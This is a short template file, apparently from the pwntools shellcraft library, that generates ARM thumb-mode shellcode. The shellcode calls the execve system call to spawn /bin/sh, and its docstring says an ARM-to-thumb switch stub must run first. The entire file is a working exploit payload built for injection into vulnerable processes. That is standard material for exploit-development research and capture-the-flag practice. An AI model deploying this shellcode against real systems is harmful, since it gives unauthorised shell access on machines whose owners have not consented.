<% from pwnlib.shellcraft import arm, common %>
<% from pwnlib.asm import cpp %>
<%docstring>Execute /bin/sh in thumb mode

need to call arm_to_thumb() shellcode first
</%docstring>
<%
	bin_sh = common.label("bin_sh")
%>

	adr r0, ${bin_sh}
	mov r2, #0
	mov r7, ${cpp("SYS_execve", arch = "thumb", os = "linux")}
	push {r0, r2}
	mov r1, sp
	svc 1

${bin_sh}:
	.ascii "/bin/sh"
